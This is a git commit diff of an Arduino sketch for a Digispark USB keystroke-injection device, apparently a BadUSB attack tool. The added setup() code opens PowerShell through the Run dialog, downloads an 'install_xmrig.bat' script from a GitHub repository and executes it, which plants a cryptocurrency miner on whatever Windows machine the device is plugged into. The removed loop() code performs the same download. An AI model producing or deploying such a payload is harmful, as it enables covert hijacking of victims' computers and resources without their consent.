a7a76a08eccb84ac8392a4e5bc0a904378516516
kazz920 <kazz920@tutamail.com>
2025-03-11 13:39:22 -0300

    fix: fixed setup.ino

--- setup.ino
+++ setup.ino
@@ -1,17 +1,23 @@
-#include "DigiKeyboard.h"
+#include "DigiKeyboardPtBr.h"
 void setup() {
+  DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.print("powershell");
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.print("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/kazz920/eden/refs/heads/main/install_xmrig.bat' -OutFile 'install_xmrig.bat'");
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(5000);
+  DigiKeyboardPtBr.print("install");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(0x2b);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
 }
 
 void loop() {
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kazz920/eden/refs/heads/main/install_xmrig.bat" -OutFile 'install_xmrig.bat'");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print(".\install_xmrig.bat");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
 }
